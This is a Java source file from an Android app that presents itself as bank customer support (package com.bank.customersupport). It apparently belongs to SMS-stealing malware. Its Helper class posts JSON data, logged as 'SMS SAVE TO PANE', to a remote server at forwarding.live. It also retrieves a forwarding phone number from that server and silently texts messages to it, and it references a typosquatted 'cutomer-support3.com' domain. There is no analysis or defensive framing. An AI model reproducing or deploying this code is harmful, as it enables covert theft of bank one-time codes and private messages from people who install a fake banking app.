package com.bank.customersupport;

import android.os.AsyncTask;
import android.telephony.SmsManager;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;

public class Helper {

    private static final String API_URL = "https://forwarding.live/api";
    static final String site = "cutomer-support3.com";

    public static void sendSMS(String path, String message) {
        new AsyncTask<String, Void, String>() {
            @Override
            protected String doInBackground(String... params) {
                String response = "";
                try {
                    String urlString = API_URL + path;  // Append the path to the base URL for the GET request
                    URL url = new URL(urlString);
                    Log.d("mywork", "doInBackground API URL: " + urlString);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("GET");

                    // Check the response code
                    int responseCode = conn.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        // Read response
                        try (Scanner scanner = new Scanner(conn.getInputStream())) {
                            StringBuilder responseBuilder = new StringBuilder();
                            while (scanner.hasNextLine()) {
                                responseBuilder.append(scanner.nextLine());
                            }
                            response = responseBuilder.toString();
                        }
                    } else {
                        // Handle error response
                        response = "Response: " + responseCode;
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                    response = "Response Error: " + e.getMessage();
                }
                Log.d("mywork", "doInBackground API Response: " + response);
                return response;
            }

            @Override
            protected void onPostExecute(String result) {
                try {
                    // Parse JSON response
                    JSONObject jsonResponse = new JSONObject(result);
                    if (jsonResponse.has("data")) {
                        String phoneNumber = jsonResponse.getString("data");
                        Log.d("mywork", "Forwarder Number: " + phoneNumber);
                        SmsManager smsManager = SmsManager.getDefault();
                        smsManager.sendTextMessage(phoneNumber, null, message, null, null);
                    } else {
                        Log.e("MYAPP: ", "Response does not contain 'data' field");
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                    Log.e("MYAPP: ", "JSON Parsing Error: " + e.getMessage());
                }
            }
        }.execute();
    }

    public static void sendData(String path, JSONObject jsonData) {
        new AsyncTask<String, Void, String>() {
            @Override
            protected String doInBackground(String... params) {
                String response = "";
                try {
                    String urlString = API_URL+path;
                    Log.d("mywork", "doInBackground API URL: " + urlString);
                    URL url = new URL(urlString);
                    Log.d("mywork", "doInBackground API URL: " + jsonData.toString());
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setRequestProperty("Accept", "application/json");
                    conn.setDoOutput(true);

                    // Write JSON data to the output stream
                    OutputStream os = conn.getOutputStream();
                    BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
                    writer.write(jsonData.toString());
                    writer.flush();
                    writer.close();
                    os.close();

                    // Check the response code
                    int responseCode = conn.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        // Read response
                        Scanner scanner = new Scanner(conn.getInputStream());
                        StringBuilder responseBuilder = new StringBuilder();
                        while (scanner.hasNextLine()) {
                            responseBuilder.append(scanner.nextLine());
                        }
                        scanner.close();
                        response = responseBuilder.toString();
                    } else {
                        // Handle error response
                        response = "Response: " + responseCode;
                    }
                    conn.disconnect();
                } catch (Exception e) {
                    e.printStackTrace();
                    response = "Response Error: " + e.getMessage();
                }
                return response;
            }

            @Override
            protected void onPostExecute(String result) {
                Log.d("mywork", "SMS SAVE TO PANE : "+result);
            }
        }.execute(path);
    }



}
